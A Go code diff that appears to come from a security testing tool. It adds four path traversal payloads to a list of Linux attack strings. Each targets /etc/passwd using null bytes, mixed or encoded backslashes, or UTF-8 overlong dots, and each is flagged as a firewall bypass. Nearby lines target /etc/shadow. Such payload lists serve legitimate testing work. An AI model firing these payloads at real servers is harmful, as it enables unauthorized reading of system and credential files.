@@ -107,6 +107,10 @@ var linuxPayloads = []Payload{
 	{Value: "%252e%252e%252f%252e%252e%252fetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "Double encoded dots", TargetFile: "/etc/passwd", WAFBypass: true},
 	{Value: "..%c0%af..%c0%afetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "UTF-8 overlong encoding", TargetFile: "/etc/passwd", WAFBypass: true},
 	{Value: "..%ef%bc%8f..%ef%bc%8fetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "UTF-8 fullwidth slash", TargetFile: "/etc/passwd", WAFBypass: true},
+	{Value: "..%00/..%00/..%00/etc/passwd", Platform: PlatformLinux, Technique: TechNullByte, Description: "Null byte between segments", TargetFile: "/etc/passwd", WAFBypass: true},
+	{Value: "..\\/..\\/..\\/etc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "Backslash-slash mixed bypass", TargetFile: "/etc/passwd", WAFBypass: true},
+	{Value: "..%5c..%5c..%5cetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "URL-encoded backslash traversal", TargetFile: "/etc/passwd", WAFBypass: true},
+	{Value: "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "UTF-8 overlong dot encoding", TargetFile: "/etc/passwd", WAFBypass: true},
 
 	// Other sensitive Linux files
 	{Value: "../../../etc/shadow", Platform: PlatformLinux, Technique: TechBasic, Description: "Shadow file", TargetFile: "/etc/shadow"},
